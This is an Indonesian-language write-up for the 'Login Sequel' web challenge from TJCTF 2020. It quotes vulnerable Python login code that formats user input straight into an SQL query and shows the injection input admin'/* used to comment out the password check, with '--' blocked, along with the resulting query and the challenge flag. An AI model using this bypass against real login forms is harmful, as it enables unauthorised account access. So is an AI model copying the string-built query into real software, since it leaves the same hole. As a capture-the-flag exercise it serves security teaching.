# TJCTF2020

## Web

### Login Sequel - 40 Points

### Flag
tjctf{W0w_wHa1_a_SqL1_exPeRt!}
### Deskripsi soal

Redirect ke suatu Website, lakukan Login dan dapatkan flag

### Solusi
Ketika kita redirect ke suatu web, diberikan hint bahwa kita harus login sebagai admin maka username pastilah admin. Lalu jika kita melakukan inspect elemen, didapatkan ada comment section
```
def get_user(username, password):
    database = connect_database()
    cursor = database.cursor()
    try:
        cursor.execute('SELECT username, password FROM `userandpassword` WHERE username=\'%s\' AND password=\'%s\'' % (username, hashlib.md5(password.encode())))
    except:
        return render_template("failure.html")
    row = cursor.fetchone()
    database.commit()
    database.close()
    if row is None: return None
    return (row[0],row[1])
```
Disini dapat diliat source code bagaimana suatu data diambil dari database. Terlihat bahwa kita dapat melakukan SQL Injection dimana, username = admin lalu yang lain dicomment. Akan tetapi bila kita menggunakan double dash (--) akan diblock dan muncul alert bahwa kita menggunakan sql injection, maka yang dapat kita lakukan adalah menggunakan syntax command yang lain yaitu /*

Maka dicoba
```
username = admin'/*
password = sdfsjkl
```

Dengan memasukan value tersebut maka Query menjadi

```
SELECT username, password FROM `userandpassword` WHERE username=admin'/*\' AND password=\'%s\'' % (username, hashlib.md5(password.encode())))
```
Sehingga Query yang valid adalah

```
SELECT username, password FROM `userandpassword` WHERE username=admin'/*
```

Maka ketika kita memasukan value tersebut didapatkan flagnya
